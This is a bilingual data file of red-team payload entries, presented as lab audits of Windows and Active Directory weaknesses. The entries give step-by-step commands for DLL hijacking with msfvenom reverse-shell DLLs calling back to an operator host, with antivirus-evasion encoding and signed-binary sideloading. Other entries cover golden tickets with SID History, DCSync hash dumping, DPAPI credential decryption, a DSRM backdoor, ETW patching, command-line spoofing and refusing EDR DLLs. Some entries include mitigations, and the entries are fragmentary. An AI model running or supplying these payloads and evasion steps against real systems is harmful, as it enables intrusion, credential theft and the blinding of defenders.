name.zh: DLL 搜索顺序与目录权限审计

description.zh: 审计服务目录可写性与 DLL 搜索顺序，验证劫持加载提权的可行面。
description.en: Audits writable service directories against DLL search order, plants a same-named library, and confirms the privileged process loads and executes it, proving the privilege-escalation surface.

overview.zh: 该 Payload 覆盖 DLL 搜索顺序与目录权限提权审计场景，检验高权限应用目录的可写性与缺失 DLL 的劫持可达性。验证维度含目录 ACL 审计、测试载荷生成与落地放置三步，对应第 1 至第 3 步。
overview.en: This payload covers DLL search-order and directory-permission escalation auditing, testing writability of privileged application directories and reachability of missing-DLL hijacks. Validation covers directory ACL audits, payload generation and drop placement, mapped to steps 1 through 3.

vulnerability.zh: 根因在于应用安装目录继承的 ACL 允许普通用户写入，而加载器按搜索顺序解析缺失 DLL：攻击者放入同名库即被高权限进程执行。
vulnerability.en: The root cause is application install directories inheriting ACLs that let standard users write while loaders resolve missing DLLs by search order: a same-named library dropped by an attacker executes inside the privileged process.

exploitation.zh: 第 1 步读取目标应用目录的 ACL，识别普通用户可写路径即锁定劫持点；第 2 步用 msfvenom 生成 64 位反向 DLL 作为验证载荷；第 3 步把 DLL 复制为目标缺失 DLL 名，copy 无报错即确认可写，等待或触发高权限进程加载并回连监听。以 SYSTEM 会话建立为成功判据。占位符在全局变量菜单替换；测试后删除载荷。
exploitation.en: In step 1, read the target application directory's ACL and identify standard-user-writable paths to lock onto the hijack point. In step 2, generate a 64-bit reverse DLL with msfvenom as the verification payload. In step 3, copy the DLL under the missing DLL's name; an errorless copy confirms writability, then wait for or trigger the privileged process to load it and call back. Judge success by establishing a SYSTEM session. Replace placeholders via the global variables menu; remove the payload after testing.

mitigation.en: Fix directory ACLs to administrator-only writes, enable DLL signing or SetDefaultDllDirectories to constrain search paths, and monitor new DLL loads. After the fix, replay step 3: the copy should be denied with no anomalous load events.

description.zh: 读取目标应用安装目录的访问控制列表；普通用户对目录具备写入权限即满足 DLL 落地劫持的前提，记录可写的具体路径供第 3 步使用。
description.en: Read the target application directory ACL; ordinary-user write access satisfies the prerequisite for planting a DLL, so note the writable path for step 3.

title.zh: 生成恶意 DLL 载荷

description.zh: 用 msfvenom 生成 64 位反向连接 DLL 保存为 evil.dll；本地监听 4444 端口就绪后等待目标进程加载触发回连。
description.en: Generate a 64-bit reverse-tcp DLL with msfvenom as evil.dll; with the 4444 listener armed, loading the DLL triggers the callback.

attackChain.payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LAB_OPERATOR_HOST} LPORT=4444 -f dll > evil.dll

title.zh: 落地 DLL 触发提权
title.en: Plant the DLL to trigger escalation

description.zh: 把第 2 步生成的 DLL 复制为目标程序缺失的 missing.dll；程序重启加载该文件并回连监听，即以服务权限获得 shell 完成提权。
description.en: Copy the step-2 DLL over the missing.dll the app searches for; on next launch the hijacked load calls back and lands a service-privileged shell.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 DLL 搜索顺序与目录权限审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for DLL Search-Order and Directory-Permission Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: DLL 搜索顺序与目录权限审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: DLL Search-Order and Directory-Permission Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 植入的 DLL 会被任意加载该目录的程序执行——使用仅弹 marker 的无害库，验证后立即还原目录。
opsecTips.en: A planted DLL executes in any process loading from that directory — use a harmless marker-only library and restore the directory immediately after verification.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 规避变体：免杀编码 DLL

wafBypass.command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LAB_OPERATOR_HOST} LPORT=4444 -f dll -e x64/xor_dynamic -i 3 > evil.dll

description.zh: 规避点：加编码器与迭代次数破坏静态特征。判据：DLL 落盘不触发告警且会话建立。
description.en: Encoder plus iterations breaks static signatures. Success: no alert on write and a session returns.

title.zh: 规避变体：签名程序 sideload

description.zh: 规避点：劫持常驻签名程序 OneDrive 的 version.dll，借其白名单进程启动。判据：监听端会话的回连进程名显示为 OneDrive.exe。
description.en: Hijacks a resident signed binary so payload rides its whitelisted process. Success: OneDrive.exe child calls back.

title.zh: 规避变体：ACL 修改最小化

description.zh: 规避点：只授予写权限而非完全控制，减少 ACL 审计差异。判据：普通用户可写但审计项更少。
description.en: Grants write-only instead of full control to shrink the audit delta. Success: user can write with fewer audit flags.

title.zh: 规避变体：事后痕迹还原

description.zh: 规避点：删除劫持 DLL 并回滚 ACL 变更。判据：目录回到初始权限且无残留文件。
description.en: Removes the DLL and reverts ACL changes. Success: directory back to baseline with no leftovers.

title.zh: 审计应用目录 ACL 权限

description.zh: 读取目标应用安装目录的访问控制列表，识别普通用户可写的 DLL 搜索路径。
description.en: Reads the ACL of the target application directory to identify DLL search paths writable by normal users.

execution.command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LAB_OPERATOR_HOST} LPORT=4444 -f dll > evil.dll

description.zh: 用 msfvenom 生成反向连接的 64 位恶意 DLL，作为目录权限验证的测试载荷。
description.en: Uses msfvenom to generate a 64-bit reverse-shell DLL as the test payload for directory-permission validation.

description.zh: 把生成的 DLL 复制到目标目录；copy 无报错且目标路径存在该文件，即确认目录可写、劫持可落地。
description.en: Copy the generated DLL into the target directory; a silent copy with the file present at the destination confirms a writable directory where hijacking lands.

name.zh: AD 跨域信任配置审计

description.zh: 枚举域与林信任的方向、传递性与 TGT 转发能力，验证跨信任边界的防护强度。
description.en: Enumerates the direction, transitivity, and TGT-forwarding behavior of domain and forest trusts, showing that missing SID filtering or selective authentication lets a forged ticket with SID History cross the trust boundary.

overview.zh: AD 跨域信任配置审计覆盖跨域信任滥用场景：针对存在域间或森林间信任的实验环境，验证信任方向与 SID 过滤配置能否被用于跨域越权。验证维度涵盖域信任与森林信任枚举、跨域用户组清点、SID History 黄金票据伪造与 TGT 申请六类步骤。
overview.en: AD Cross-Domain Trust Configuration Audit covers cross-domain trust abuse: in lab environments with inter-domain or forest trusts, verify whether trust direction and SID filtering configurations enable cross-domain escalation. Verification dimensions cover domain and forest trust enumeration, cross-domain user/group inventory, SID History golden ticket forgery, and TGT requests — six steps.

vulnerability.zh: 根因是外部信任未启用 SID 过滤或选择性认证：攻击者持有源域 krbtgt 哈希即可伪造携带目标域高危组 SID History 的票据跨域通行；双向信任叠加缺失过滤时，单个域沦陷会沿信任链放大为森林级影响。
vulnerability.en: The root cause is external trusts without SID filtering or selective authentication: holding the source domain's krbtgt hash lets an attacker forge tickets carrying target-domain high-privilege SID History entries; bidirectional trusts without filtering amplify a single domain compromise into forest-level impact along the trust chain.

exploitation.zh: 按 Payload 列表顺序使用：第 1、2 步用 Get-NetDomainTrust 与 Get-NetForestTrust 枚举信任方向与 trust attributes，确认双向信任且未启用 SID 过滤即发现缺口；第 3、4 步清点目标域用户与组，锁定高价值目标；第 5 步用 mimikatz kerberos::golden 伪造带目标域 519 SID History 的跨域黄金票据并 /ptt 注入，klist 可见即确认成功；第 6 步用 asktgt 申请目标域 TGT 补充验证可达性。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: steps 1 and 2 enumerate trust direction and trust attributes with Get-NetDomainTrust and Get-NetForestTrust — bidirectional trusts without SID filtering reveal the gap; steps 3 and 4 inventory target-domain users and groups to lock high-value targets; step 5 forges a cross-domain golden ticket carrying the target domain's 519 SID History with mimikatz kerberos::golden and injects it via /ptt — visible in klist confirms success; step 6 requests a target-domain TGT with asktgt to confirm reachability. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
外部信任启用 SID 过滤与选择性认证，两阶段轮换全部域 krbtgt（首次随机重置、超票据寿命后再次重置），监控带 SID History 的票据：
    netdom trust corp.local /domain:partner.external /quarantine:yes
    netdom trust corp.local /domain:partner.external /selectiveauth:yes
    Set-ADAccountPassword -Reset -Identity krbtgt -NewPassword (Read-Host -AsSecureString)
    修复后用第 5 步样例回归，带 SID History 的票据应被目标域 KDC 拒绝。
mitigation.en: Enable SID filtering and selective authentication on external trusts, rotate all domains' krbtgt passwords periodically (twice, per registry policy), and monitor ticket requests carrying SID History plus anomalous cross-domain TGTs. After the fix, regress with the step 5 sample: tickets with SID History must be rejected by the target domain's KDC.

description.zh: 运行 Get-NetDomainTrust 列出信任方向与类型；存在 INBOUND 或双向信任的目标域即跨域攻击候选。
description.en: Run Get-NetDomainTrust to list trust direction and type; INBOUND or bidirectional trusts mark candidate target domains.

title.zh: 摸清林内信任与目标域人员
title.en: Chart forest trusts and target accounts

description.zh: 用 Get-NetForestTrust 扩到林级，再以 Get-NetUser 与 Get-NetGroup 枚举目标域账号与高价值组；锁定管理员清单即完成跨域情报储备。
description.en: Expand with Get-NetForestTrust, then enumerate target-domain users and groups with Get-NetUser/Get-NetGroup; locking the admin list completes cross-domain intelligence.

description.zh: 用源域 krbtgt 哈希构造携带目标域企业管理员组 SID（目标域 SID 加 RID 519，即 /sids 参数）的黄金票据并注入；klist 出现新票据并能以管理员身份访问目标域资源即跨域身份伪造完成。
description.en: Build a golden ticket with the source krbtgt hash carrying the target S-519 SID and inject it; the ticket visible in klist completes the cross-domain admin forgery.

title.zh: 请求目标域票据完成接管
title.en: Request target-domain tickets to finish takeover

description.zh: 用 Rubeus asktgt（或 Kekeo tgt::ask）以哈希直接请求目标域 TGT；获得可用票据后访问目标域服务即完成跨域控制闭环。
description.en: Request a target-domain TGT directly with asktgt.exe using the hash; a usable ticket accessing target services closes the cross-domain takeover.

prerequisites.zh: 确认 AD 跨域信任配置审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for AD Cross-Domain Trust Configuration Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: AD 跨域信任配置审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: AD Cross-Domain Trust Configuration Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 信任枚举与 SID History 伪造只作用于实验域对；伪造票据有效期压到最短并在验证后立即清除。
opsecTips.en: Restrict trust enumeration and SID-History forgery to the lab domain pair, issue forged tickets with the shortest feasible lifetime, and purge them right after verification.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避 PowerView/DSInternals 模块特征：系统自带 nltest 枚举全部信任；输出信任域清单即成功。

description.zh: 枚举域信任关系；成功时输出信任列表，含方向、类型与对端域名。
description.en: Enumerate domain trust relationships; output listing trusts with direction, type, and peer domain confirms success.

title.en: AD Cross-Domain Trust Configuration Audit Reviewed Command 5

description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_5 with blue-team logs; the cross-domain golden ticket injecting with klist showing a ticket carrying SID history 519 confirms success.

description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_6 with blue-team logs; asktgt obtaining a TGT written to the cache and visible in klist confirms success.

explanation.en: pass the ticket into the current session

name.zh: AD 权限路径与提权链验证

description.zh: 用 BloodHound/SharpHound 枚举 ACL 到域管的可提权路径，验证危险权限链是否可达。
description.en: Enumerates ACL-based escalation paths to Domain Admin with BloodHound/SharpHound, confirming whether dangerous grants such as WriteDACL, GenericAll, or Replication-Get-Changes-All actually connect ordinary accounts to domain control.

overview.zh: AD 权限路径只读验证覆盖域内权限提升场景：针对持有普通域账号的测试主体，验证从普通用户到域管理员组的可达路径。验证维度涵盖 BloodHound 最短路径图查询、WriteDACL/GenericAll ACE 枚举、DCSync 权限授予与目标密码重置六类技术变体。
overview.en: AD Privilege-Path Read-Only Validation covers intra-domain privilege escalation: for a test principal holding an ordinary domain account, verify reachable paths from a regular user to the domain admins group. Verification dimensions span BloodHound shortest-path graph queries, WriteDACL/GenericAll ACE enumeration, DCSync permission grants, and target password resets — six variants.

vulnerability.zh: 根因是目录 ACL 配置过宽：普通账号对高价值对象持有 WriteDACL、GenericAll 等控制权限，或被授予 Replication-Get-Changes-All 复制权限，攻击者借此注入 DCSync 权限、重置特权账号密码，拼接出到达域管理员的完整链路。
vulnerability.en: The root cause is overly broad directory ACLs: ordinary accounts hold control rights such as WriteDACL and GenericAll over high-value objects or carry Replication-Get-Changes-All, letting an attacker graft DCSync rights, reset privileged passwords, and stitch together a complete path to domain admin.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 BloodHound shortestPath 查询当前用户到域管理员组的攻击路径，返回路径即确认提升面；第 2、5 步用 Get-ObjectAcl 枚举 WriteDACL 与 GenericAll 可控对象；第 3 步对目标对象授予 DCSync 权限，ACL 出现 Replication-Get-Changes-All 新增 ACE 即确认成功；第 4 步用 dcsync 导出 Administrator 哈希验证链路；第 6 步用 Set-DomainUserPassword 重置目标密码作为替代路径。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 queries the BloodHound shortestPath from the current user to domain admins — a returned path confirms the escalation surface; steps 2 and 5 enumerate WriteDACL and GenericAll controllable objects with Get-ObjectAcl; step 3 grants DCSync on the target — a new Replication-Get-Changes-All ACE confirms success; step 4 exports the Administrator hash with dcsync to validate the chain; step 6 resets the target password as an alternate path. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
实施分层管理与最小目录权限，移除普通账号对特权对象的 WriteDACL/GenericAll 与复制扩展权限，部署特权访问工作站并监控 4662 与 ACL 变更：
    $path = "AD:\CN=Domain Admins,CN=Users,DC=corp,DC=local"
    $acl = Get-Acl $path
    $acl.Access | Where-Object { $_.IdentityReference -like "*\Helpdesk*" } |
      ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
    Set-Acl $path $acl
    dsacls "DC=corp,DC=local" /R "CORP\Helpdesk"        # 移除复制扩展权限
    修复后用第 1、2 步样例回归，图查询不应再返回普通用户到特权组的路径。
mitigation.en: Enforce tiered administration and least-privilege directory ACLs, remove WriteDACL/GenericAll from ordinary accounts over privileged objects, tighten replication extended rights, and deploy PAWs; monitor 4662 replication access and ACL change events. After the fix, regress with the step 1 and step 2 samples: graph queries must no longer return ordinary-user paths to privileged groups.

title.en: Map escalation paths in the graph

description.zh: 在 BloodHound 执行 shortestPath 查询普通用户到域管组的路径；返回的攻击路径即选定本次提权链条。
description.en: Run a shortestPath query in BloodHound from a normal user to the domain admins group; the returned path is the chosen escalation chain.

attackChain.payload: MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@{LAB_DOMAIN}" RETURN p

title.zh: 枚举可滥用 ACL 入口

description.zh: 用 Get-ObjectAcl 分别过滤 WriteDACL 与 GenericAll 目标；列出的可写对象即权限滥用入口，配合图谱排定优先级。
description.en: Filter Get-ObjectAcl output for WriteDACL and GenericAll targets; the writable objects are abuse entry points to prioritize against the graph.

description.zh: 用 Add-DomainObjectAcl 给当前账号添加 DCSync 权限；命令无报错且回查 ACL 含当前用户即权限注入成功。
description.en: Use Add-DomainObjectAcl to grant your account DCSync rights; no errors and the account present on re-inspection confirm the injection.

title.en: Dump the administrator hash via DCSync

description.zh: 运行 mimikatz lsadump::dcsync /user:Administrator；拿到 NTLM 哈希即可直接哈希登录，等于掌握域管身份。
description.en: Run mimikatz lsadump::dcsync /user:Administrator; the NTLM hash enables hash logins and equals holding the domain admin identity.

description.zh: 对持有 GenericAll 的目标运行 Set-DomainUserPassword 重置口令；用新口令登录该账号即建立备用控制路径。
description.en: Reset the password of a GenericAll-controlled target with Set-DomainUserPassword; logging in with the new password builds a fallback control path.

execution.command: MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@{LAB_DOMAIN}" RETURN p

description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_PRIVILEGE_ESCALATION_E_1 with blue-team logs; the graph query returning an attack path from User to the domain-admins group confirms success.

name.zh: DPAPI 保护范围与审计验证

description.zh: 定位 Master Key 与加密 Blob 并解密（授权环境），验证 DPAPI 保护的应用凭据边界。
description.en: Locates DPAPI master keys and protected blobs and decrypts them in the authorized lab, demonstrating that once an attacker holds the user context, saved application credentials are recoverable offline.

subCategory.zh: 本机注册表与保护存储

overview.zh: 该 Payload 覆盖 DPAPI 保护范围与解密路径审计场景，检验受保护凭据 blob 与主密钥的可提取性。验证维度含凭据目录枚举、blob 解密与内存主密钥提取三步，对应第 1 至第 3 步。
overview.en: This payload covers DPAPI protection-scope and decryption-path auditing, testing how extractable protected credential blobs and master keys are. Validation covers credential-directory enumeration, blob decryption and in-memory master-key extraction, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 DPAPI 主密钥由用户口令派生且以可还原形式驻留内存与配置：攻击者拿到用户上下文即可枚举 blob，配合内存提取的主密钥离线还原全部保存凭据。
vulnerability.en: The root cause is DPAPI master keys deriving from the user password while remaining recoverable in memory and profile files: an attacker in the user context can enumerate blobs and, with memory-extracted master keys, restore every saved credential offline.

exploitation.zh: 第 1 步枚举用户 Credentials 目录列出受保护 blob 文件即定位完成；第 2 步用 mimikatz 的 dpapi::cred 解密指定 blob，输出凭据明文即确认保护范围可穿越；第 3 步以 sekurlsa::dpapi 从内存提取 master key 及关联 GUID，供离线解密其他 blob。以明文凭据输出为成功判据。占位符在全局变量菜单替换；仅在授权实验会话内操作。
exploitation.en: In step 1, enumerate the user Credentials directory to list protected blob files. In step 2, decrypt a chosen blob with mimikatz dpapi::cred; plaintext output confirms the protection scope is crossable. In step 3, extract master keys with associated GUIDs from memory via sekurlsa::dpapi for offline decryption of other blobs. Use plaintext credential output as the success criterion. Replace placeholders via the global variables menu; operate only inside authorized lab sessions.

mitigation.zh:
为敏感凭据启用域级 DPAPI 备份限制与 LSA 保护（PPL/Credential Guard），终端监控 Credentials 目录与 LSASS 异常访问：
    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags /t REG_DWORD /d 1 /f
    <ProcessAccess onmatch="include"><TargetImage condition="end with">lsass.exe</TargetImage></ProcessAccess>
    修复后重放第 2、3 步，解密与内存提取应被阻断并产生告警。
mitigation.en: Enable domain-scoped DPAPI backup restrictions and LSA protection for sensitive credentials, monitoring anomalous access to the Credentials directory and LSASS. After the fix, replay steps 2 and 3: decryption and memory extraction should be blocked with alerts.

title.zh: 枚举 DPAPI 凭据文件

description.zh: 列出用户 Credentials 目录下的隐藏 blob 文件；输出文件名与修改时间即定位受保护凭据的存储位置，文件越多可收割的秘密越多。
description.en: List hidden blobs in the user's Credentials folder; filenames and timestamps locate the DPAPI-protected secrets ready for decryption.

description.zh: 用 mimikatz 的 dpapi::cred 指定 blob 路径解密；输出明文口令或保存的远程资源凭据即还原受保护秘密，可立即用于登录对应服务。
description.en: Decrypt a chosen blob with mimikatz dpapi::cred; plaintext passwords or saved remote credentials come out ready for reuse.

title.zh: 提取 Master Key 扩大解密面
title.en: Extract master keys to widen decryption

description.zh: 用 sekurlsa::dpapi 从 LSASS 内存提取 master key；拿到密钥与关联 GUID 即可离线解密该用户的全部 blob，完成整个账户的凭据收割。
description.en: Pull master keys from LSASS with sekurlsa::dpapi; key plus GUID enables offline decryption of every blob belonging to that user.

name.zh: DSRM 配置与登录行为审计

description.zh: 审计 DSRM 账户密码与登录策略配置，验证域控恢复模式后门面。
description.en: Audits the DSRM account password and the DsrmAdminLogonBehavior registry value, then demonstrates network logon with the recovery password, the domain-controller backdoor path that bypasses the directory database.

overview.zh: 该 Payload 覆盖 DSRM 配置与登录行为审计场景，检验目录恢复密码与域账号的同步链路及网络登录面。验证维度含哈希提取、DSRM 同步、登录行为改写与哈希传递四步，对应第 1 至第 4 步。
overview.en: This payload covers DSRM configuration and logon-behavior auditing, testing the sync chain between Directory Services Restore Mode passwords and domain accounts plus network-logon exposure. Validation covers hash extraction, DSRM syncing, logon-behavior rewriting and pass-the-hash, mapped to steps 1 through 4.

vulnerability.zh: 根因在于 DSRM 密码可与域账号同步而默认仅限本机登录，攻击者改写 DsrmAdminLogonBehavior 后即可经网络以恢复密码进入域控，形成绕过域目录的后门。
vulnerability.en: The root cause is the DSRM password being syncable with a domain account while restricted to local logon by default: after rewriting DsrmAdminLogonBehavior, attackers enter the DC over the network with the restore password, a backdoor bypassing the directory.

exploitation.zh: 第 1 步用 mimikatz 提取 krbtgt 等哈希并转储本地 SAM；第 2 步以 ntdsutil 把 DSRM 密码同步到指定域账户；第 3 步写入 DsrmAdminLogonBehavior 为 2 解除登录限制；第 4 步以同步后的 NTLM 哈希对域控执行哈希传递验证可达性。以远程会话建立为判据。占位符在全局变量菜单替换；测试后还原配置并重置 DSRM 密码。
exploitation.en: In step 1, extract krbtgt-class hashes with mimikatz and dump the local SAM. In step 2, sync the DSRM password to a chosen domain account with ntdsutil. In step 3, write DsrmAdminLogonBehavior as 2 lifting logon limits. In step 4, pass the synced NTLM hash against the DC to verify reachability. Judge by an established remote session. Replace placeholders via the global variables menu; restore settings and reset the DSRM password after testing.

mitigation.zh:
定期轮换每台域控 DSRM 密码且互不相同，DsrmAdminLogonBehavior 固定 0 禁止网络登录，监控 4657 注册表事件：
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 0 /f
    auditpol /set /subcategory:"Registry" /success /failure
    ntdsutil
    set dsrm password
    reset password on server null
mitigation.en: Rotate every DC's DSRM password regularly with unique values, monitor DsrmAdminLogonBehavior and 4657 registry events. After the fix, replay steps 3 and 4: rewrites should be blocked and network logons denied.

name.zh: ETW 提供程序完整性审计

description.zh: 验证 ETW 提供程序完整性（providerguid 补丁、禁用痕迹），验证遥测绕过面。
description.en: Patches the first byte of EtwEventWrite to a return instruction and flips provider SetEnabled state in-process, then audits which ETW streams go silent and what integrity checks catch the telemetry kill.

category.zh: 终端防护与遥测完整性

overview.zh: ETW 提供程序完整性审计覆盖遥测静默场景：针对部署 ETW 事件采集与 EDR 的终端，验证托管 API、反射调用与内存修补三类变体能否中断提供程序事件流。验证维度涵盖托管 SetEnabled 关闭、C# 反射禁用与 ntdll!EtwEventWrite 修补。
overview.en: ETW Provider Integrity Audit covers telemetry silencing: on endpoints with ETW collection and EDR deployed, verify whether managed-API, reflection, and in-memory patching variants can interrupt provider event streams. Verification dimensions cover managed SetEnabled shutdown, C# reflection disabling, and ntdll!EtwEventWrite patching.

vulnerability.zh: 根因是 ETW 事件流在进程内存在两个中断点：EventProvider.SetEnabled 托管入口可关闭 provider，而 ntdll!EtwEventWrite 首字节被改写为 ret 后所有遥测写入静默返回；依赖单一 ETW 源的检测随之失明。
vulnerability.en: The root cause is two in-process interruption points for ETW streams: the managed EventProvider.SetEnabled entry can disable a provider, and once ntdll!EtwEventWrite's first byte is rewritten to ret, all telemetry writes silently return; detection relying on a single ETW source goes blind.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 PowerShell 托管 EventProvider 实例调用 SetEnabled(0)，对应 provider 事件流中断即确认成功；第 2 步用 C# 反射调用非公开 SetEnabled 复现并对比遥测差异；第 3 步用 VirtualProtect+WriteProcessMemory 把 ntdll!EtwEventWrite 首字节改为 0xC3，ETW 遥测停止记录即确认修补生效，同时记录 EDR 是否对内存修改产生告警。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 calls SetEnabled(0) on a managed EventProvider instance in PowerShell — the provider's stream stops confirms success; step 2 replays with C# reflection on the non-public SetEnabled and compares telemetry; step 3 rewrites ntdll!EtwEventWrite's first byte to 0xC3 via VirtualProtect+WriteProcessMemory — ETW telemetry halting confirms the patch, while noting whether the EDR alerts on the memory modification. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
启用防篡改与 VBS/内存完整性，监控对 ntdll 区域的 VirtualProtect/WriteProcessMemory 写访问与 provider 异常停止，多源交叉校验：
    Set-MpPreference -DisableTamperProtection $false
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v HypervisorEnforcedCodeIntegrity /t REG_DWORD /d 1 /f
mitigation.en: Enable tamper protection and memory integrity, monitor VirtualProtect/WriteProcessMemory writes into ntdll regions plus abnormal provider stop events, and cross-validate with kernel callbacks, security products, and ETW multi-source collection. After the fix, regress with the step 1 and step 3 samples: both shutdown and patching must be blocked or alerted.

name.zh: 进程参数多源遥测审计

description.zh: 验证进程参数欺骗后多源遥测（PEB/命令行）的差异检测。
description.en: Splits lpApplicationName and lpCommandLine and uses interpreter-level variable expansion to produce divergent argument views, then compares which multi-source telemetry still reconstructs the true command line.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

overview.zh: 进程参数多源遥测审计覆盖命令行伪装检测场景：针对依赖单一命令行来源的检测逻辑，验证 lpApplicationName 与 lpCommandLine 不一致、环境变量执行等变体能否被识别。验证维度涵盖创建参数不一致执行、变量间接执行与多源命令行比对三类。
overview.en: Process-Argument Multi-Source Telemetry Audit covers command-line masquerading detection: for detection logic relying on a single command-line source, verify whether variants such as lpApplicationName/lpCommandLine inconsistency and environment-variable execution are recognizable. Verification dimensions cover inconsistent creation arguments, indirect variable execution, and multi-source command-line comparison.

vulnerability.zh: 根因是进程的 lpApplicationName 与 lpCommandLine 可分别指定，环境变量展开又发生在 cmd 进程内部，检测若只读取其中一处即被另一处欺骗；内核创建事件、PEB 与 WMI 等多源遥测之间的差异是核心检测信号。
vulnerability.en: The root cause is that lpApplicationName and lpCommandLine are specified independently and environment-variable expansion happens inside the cmd process, so a detection reading only one is deceived by the other; divergence across multi-source telemetry — kernel creation events, PEB, and WMI — is the core detection signal.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步以 lpApplicationName 指向 cmd.exe 而 lpCommandLine 写入另一条命令创建进程，多源遥测记录出现差异即确认伪装成立；第 2 步用环境变量间接执行使命令行仅见变量名，对比检测可见性差异；第 3 步用 Win32_Process 输出命令行清单，与内核侧数据比对完成伪装识别验证。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 creates a process with lpApplicationName pointing at cmd.exe while lpCommandLine carries a different command — divergence across telemetry sources confirms the masquerade; step 2 executes indirectly via an environment variable so the command line shows only the variable name, comparing detection visibility; step 3 lists command lines with Win32_Process and compares against kernel-side data to finish validation. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
交叉核对 ETW 内核创建事件与 PEB/WMI 命令行快照，对创建参数不一致与可疑变量间接执行告警，保留原始审计数据防篡改：
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
    auditpol /set /subcategory:"Process Creation" /success
    Get-CimInstance Win32_Process -Filter "Name='cmd.exe'" | Select ProcessId, ExecutablePath, CommandLine
mitigation.en: Cross-check ETW kernel creation events against PEB/WMI command-line snapshots, alert on inconsistent creation arguments and suspicious indirect variable execution, and retain raw audit data against tampering. After the fix, regress with the step 1 and step 2 samples: masquerade variants must trigger multi-source divergence alerts.

description.zh: 绕过命令行快照一致性校验：lpApplicationName 指定真实 cmd.exe，lpCommandLine 首令牌伪装为 notepad.exe；cmd 忽略自身 argv[0] 后继续解析 /c 子命令，遥测记录的 CommandLine 是伪装形态。成功判据：arg-spoof.txt 生成且内容为 whoami 输出，而事件日志 CommandLine 显示 notepad.exe。
description.en: Points lpApplicationName at the real cmd.exe while the first lpCommandLine token spoofs notepad.exe; cmd skips its own argv[0] and still parses the /c subcommand, so telemetry records the spoofed form. Success: arg-spoof.txt holds whoami output while event logs show the notepad.exe token.

description.en: Sets ProcessSignaturePolicy to Microsoft-signed-only on the payload process and confirms the EDR's unsigned userland injection DLLs are refused, leaving the process unmonitored from within.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

